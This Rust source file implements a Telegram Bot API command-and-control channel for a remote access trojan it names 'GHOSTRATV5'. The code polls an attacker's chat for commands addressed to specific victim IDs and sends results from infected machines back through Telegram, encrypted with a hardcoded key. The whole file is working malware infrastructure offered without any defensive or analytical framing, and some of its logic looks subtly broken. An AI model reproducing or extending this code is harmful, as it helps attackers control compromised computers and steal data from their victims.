//! Telegram Bot C2 channel.
//!
//! Uses the Telegram Bot API for command delivery and result collection.
//! Commands are sent as messages in a specific chat, formatted as:
//! "GHOST <victim_id> <cmd_type_hex> [base64_data]"

use crate::c2::{C2Channel, C2Error, Command};
use serde::{Deserialize, Serialize};
use tracing::{debug, error, info, warn};

const TELEGRAM_API_BASE: &str = "https://api.telegram.org";

/// Telegram C2 channel implementation
pub struct TelegramC2 {
    bot_token: String,
    chat_id: i64,
    last_update_id: Option<i64>,
    available: bool,
}

#[derive(Debug, Deserialize)]
struct TelegramResponse {
    ok: bool,
    result: Option<serde_json::Value>,
    description: Option<String>,
    error_code: Option<u32>,
}

#[derive(Debug, Serialize)]
struct SendMessageRequest {
    chat_id: i64,
    text: String,
    parse_mode: Option<String>,
}

#[derive(Debug, Deserialize)]
struct TelegramMessage {
    message_id: i64,
    chat: TelegramChat,
    text: Option<String>,
    date: i64,
}

#[derive(Debug, Deserialize)]
struct TelegramChat {
    id: i64,
    #[serde(rename = "type")]
    chat_type: String,
}

#[derive(Debug, Deserialize)]
struct GetUpdatesResponse {
    ok: bool,
    result: Option<Vec<TelegramUpdate>>,
}

#[derive(Debug, Deserialize)]
struct TelegramUpdate {
    update_id: i64,
    message: Option<TelegramMessage>,
}

impl TelegramC2 {
    pub fn new(bot_token: String, chat_id: i64) -> Self {
        Self {
            bot_token,
            chat_id,
            last_update_id: None,
            available: true,
        }
    }

    /// Make a request to the Telegram Bot API
    async fn telegram_request(&self, method: &str, body: &serde_json::Value) -> Result<TelegramResponse, C2Error> {
        let url = format!("{}/bot{}/{}", TELEGRAM_API_BASE, self.bot_token, method);
        let client = reqwest::Client::new();

        let response = match client.post(&url).json(body).send().await {
            Ok(resp) => resp,
            Err(e) => {
                warn!("Telegram request failed for {}: {}", method, e);
                self.available = false;
                return Err(C2Error::Unreachable);
            }
        };

        let text = match response.text().await {
            Ok(t) => t,
            Err(e) => {
                error!("Failed to read Telegram response: {}", e);
                return Err(C2Error::Http(e));
            }
        };

        debug!("Telegram response: {}", text);

        match serde_json::from_str::<TelegramResponse>(&text) {
            Ok(resp) => Ok(resp),
            Err(e) => {
                error!("Failed to parse Telegram response: {} (body: {})", e, text);
                Err(C2Error::Parse(e))
            }
        }
    }

    /// Parse a command from a Telegram message text
    fn parse_command(text: &str) -> Option<Command> {
        // Format: "GHOST <victim_id> <cmd_type_hex> [data]"
        if !text.starts_with("GHOST ") {
            return None;
        }

        let parts: Vec<&str> = text[6..].splitn(3, ' ').collect();
        if parts.is_empty() {
            return None;
        }

        let victim_id = parts[0].to_string();
        let cmd_type_hex = parts[1];
        let data = if parts.len() > 2 { parts[2] } else { "" };

        // Parse cmd_type from hex
        let cmd_type = u8::from_str_radix(cmd_type_hex.trim_start_matches("0x"), 16)
            .ok()?;

        // Decode base64 data if present
        let decoded_data = if !data.is_empty() {
            base64::decode(data).unwrap_or_default()
        } else {
            Vec::new()
        };

        Some(Command {
            victim_id,
            cmd_type,
            data: decoded_data,
            encrypted: false,
            crypto_key: "GHOSTRATV5".to_string(),
        })
    }
}

#[async_trait::async_trait]
impl C2Channel for TelegramC2 {
    fn name(&self) -> &str {
        "telegram"
    }

    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error> {
        let mut commands = Vec::new();

        // Build update request
        let mut params = serde_json::json!({
            "limit": 10,
            "timeout": 5,
        });
        if let Some(uid) = self.last_update_id {
            params["offset"] = serde_json::json!(uid + 1);
        }

        let response = self.telegram_request("getUpdates", &params).await?;

        if !response.ok {
            if let Some(desc) = &response.description {
                if desc.contains("Too Many Requests") {
                    if let Some(error_code) = response.error_code {
                        self.last_update_id = Some(self.last_update_id.unwrap_or(0) + 1);
                        // Retry after rate limit
                        tokio::time::sleep(std::time::Duration::from_secs(error_code as u64 * 5)).await;
                        return Ok(Vec::new());
                    }
                }
            }
            return Err(C2Error::Other(
                response.description.clone().unwrap_or_else(|| "Unknown error".to_string())
            ));
        }

        let updates = response.result.unwrap_or_default();
        for update in updates {
            self.last_update_id = Some(update.update_id);

            let msg = match update.message {
                Some(m) => m,
                None => continue,
            };

            // Only process messages from our chat
            if msg.chat.id != self.chat_id {
                continue;
            }

            let text = match msg.text {
                Some(t) => t,
                None => continue,
            };

            debug!("Telegram message: {}", text);

            if let Some(cmd) = Self::parse_command(&text) {
                commands.push(cmd);
                info!("Parsed command from Telegram: 0x{:02X} for {}", cmd.cmd_type, cmd.victim_id);
            }
        }

        Ok(commands)
    }

    async fn send_result(&self, victim_id: &str, result: &[u8]) -> Result<(), C2Error> {
        // Encrypt result
        let encrypted = crate::crypto::encrypt_with_integrity(result, "GHOSTRATV5");
        let encoded = base64::encode(&encrypted);

        let message = format!(
            "GHOST {}\n0x{:02X}\n{}",
            victim_id,
            0xFF, // result marker
            encoded
        );

        // Telegram has a 4096 character limit for messages
        let max_len = 4000;
        if message.len() > max_len {
            // Split into chunks
            let chunks = message.as_bytes().chunks(max_len);
            for chunk in chunks {
                let chunk_str = String::from_utf8_lossy(chunk).to_string();
                let body = serde_json::json!({
                    "chat_id": self.chat_id,
                    "text": chunk_str,
                    "parse_mode": Some("HTML".to_string()),
                });
                self.telegram_request("sendMessage", &body).await?;
            }
        } else {
            let body = serde_json::json!({
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": Some("HTML".to_string()),
            });
            self.telegram_request("sendMessage", &body).await?;
        }

        Ok(())
    }

    fn is_available(&self) -> bool {
        self.available
    }
}
